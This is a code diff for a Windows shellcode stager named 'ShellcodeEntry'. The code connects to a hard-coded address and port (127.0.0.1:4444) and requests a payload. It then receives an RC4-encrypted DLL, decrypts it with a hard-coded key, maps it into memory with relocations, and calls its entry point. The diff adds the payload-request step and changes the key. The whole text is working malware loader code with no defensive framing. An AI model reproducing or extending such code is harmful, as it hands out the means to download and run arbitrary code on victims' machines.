@@ -21,20 +21,24 @@ typedef int(WINAPI* fnRecv)(UINT_PTR, char*, int, int);
 typedef int(WINAPI* fnSend)(UINT_PTR, const char *, int, int);
 
 #pragma pack(push, 1)
-struct StummPacket
+struct ProtocolHeader
 {
     uint8_t magic;
+    uint8_t sender;
     uint16_t command;
-    uint32_t dataLength;
-    char payload[256];
+    uint32_t data_length;
 };
 #pragma pack(pop)
+
+#define MAGIC_BYTE          0x53
+#define SENDER_SHELLCODE    0x01
+#define CMD_GET_PAYLOAD     0x0001
 
 // Target DLL Entry Point Signature
 typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
 
-#define RAW_IP   0x7F000001     // 127.0.0.1
-#define RAW_PORT 4444           // Port 4444
+#define RAW_IP    0x7F000001     // 127.0.0.1
+#define RAW_PORT  4444           // Port 4444
 
 inline void* memcpy(void* dest, const void* src, size_t n) {
     char* d = (char*)dest;
@@ -73,7 +77,9 @@ static void rc4_decrypt(const unsigned char *key, int key_len, char *rawBuf, uns
     }
 }
 
-extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
+extern "C" __attribute__((section(".text$A")))
+void ShellcodeEntry()
+{
     ULONG_PTR kernel32 = GetKernel32Base();
     if (!kernel32)
         return;
@@ -128,6 +134,14 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
     if (pConnect(s, (sockaddr*)&targetAddr, sizeof(targetAddr)) != 0)
         return;
 
+    // Download payload.dll
+    ProtocolHeader req;
+    req.magic = MAGIC_BYTE;
+    req.sender = SENDER_SHELLCODE;
+    req.command = CMD_GET_PAYLOAD;
+    req.data_length = 0;
+    pSend(s, (char *)&req, sizeof(req), 0);
+
     // Receive 4-Byte Payload Length Integer Descriptor
     unsigned int payloadSize = 0;
     int bytesRead = pRecv(s, (char*)&payloadSize, 4, 0);
@@ -149,7 +163,8 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
         totalReceived += chunk;
     }
 
-    char rc4Key[] = "RC4";
+    // RC4 key
+    char rc4Key[] = "StummKey2026";
     int rc4KeyLen = sizeof(rc4Key) - 1;
 
     rc4_decrypt((unsigned char *)rc4Key, rc4KeyLen, rawBuf, payloadSize);
@@ -233,7 +248,6 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
                 WORD offset = entry[i] & 0x0FFF;
                 if (type == 3) 
                 {
-                    // IMAGE_REL_BASED_HIGHLOW (x86 standard descriptor matching 32-bit compilation models)
                     DWORD* patchAddr = (DWORD*)(imageBase + reloc->VirtualAddress + offset);
                     *patchAddr += delta;
                 }
@@ -243,11 +257,10 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
         }
     }
 
-    // Jump and Run target DLL Entry Point
     if (ntHeaders->OptionalHeader.AddressOfEntryPoint != 0)
     {
         fnDllMain pDllMain = (fnDllMain)(imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-        pDllMain((HINSTANCE)imageBase, 1, NULL); // DLL_PROCESS_ATTACH = 1
+        pDllMain((HINSTANCE)imageBase, 1, (LPVOID)rc4Key);
     }
 }
 
